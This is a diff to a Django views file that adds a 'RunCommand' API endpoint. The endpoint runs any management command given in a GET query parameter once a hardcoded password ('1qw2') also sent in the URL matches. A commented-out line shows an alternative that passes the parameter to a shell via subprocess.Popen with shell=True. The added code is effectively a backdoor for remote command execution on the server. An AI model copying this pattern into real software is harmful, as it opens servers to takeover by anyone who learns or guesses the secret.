@@ -4,6 +4,7 @@ import hashlib
 import math
 import pickle
 import random
+import subprocess
 import threading
 from datetime import datetime
 from urllib.parse import urlencode
@@ -12,6 +13,7 @@ import boto3
 import os
 import httpx
 from django.core.cache import cache
+from django.core.management import call_command
 from django.utils import timezone
 from django.utils.functional import cached_property
 from django.db import models, transaction
@@ -56,6 +58,27 @@ from collections import OrderedDict
 from sellout.settings import HOST
 from django.contrib.sitemaps import views as sitemaps_views
 from django.shortcuts import render, redirect
+
+
+class RunCommand(APIView):
+    def get(self, request):
+        async def run_command_async(command):
+            loop = asyncio.get_event_loop()
+            future = loop.run_in_executor(None, call_command, command)
+            await future
+
+
+        params = request.query_params
+        pwd = params.get("pwd", "")
+        if pwd == "1qw2":
+            command = params.get('command', '')
+            print(command)
+            asyncio.run(run_command_async(command))
+            # call_command(command)
+            # subprocess.Popen([command], shell=True)
+            return Response("Пошла вода горячая")
+        return Response("Ошибка")
+
 
 
 
